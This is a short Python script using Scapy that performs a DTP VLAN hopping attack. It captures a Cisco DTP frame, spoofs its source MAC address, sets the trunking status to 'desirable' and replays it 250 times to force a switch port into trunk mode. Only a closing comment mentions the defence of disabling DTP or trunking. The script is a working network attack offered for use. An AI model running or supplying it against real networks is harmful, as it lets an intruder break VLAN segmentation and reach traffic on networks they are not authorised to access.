from scapy.all import *
load_contrib("dtp")

#Capture DTP frame
pkt = sniff(filter="ether dst 01:00:0c:cc:cc:cc",count=1)

#Change the MAC address
pkt[0].src="00:00:00:11:11:11"

#Change DTP status to desirable 
pkt[0][DTP][DTPSTATUS].status='\x03'

#send into network
for i in range (0,250):
    sendp(pkt[0], loop=0, verbose=1) 
    time.sleep(1)
    

# To avoid such attacks on vlans disable dtp or trunking on your network
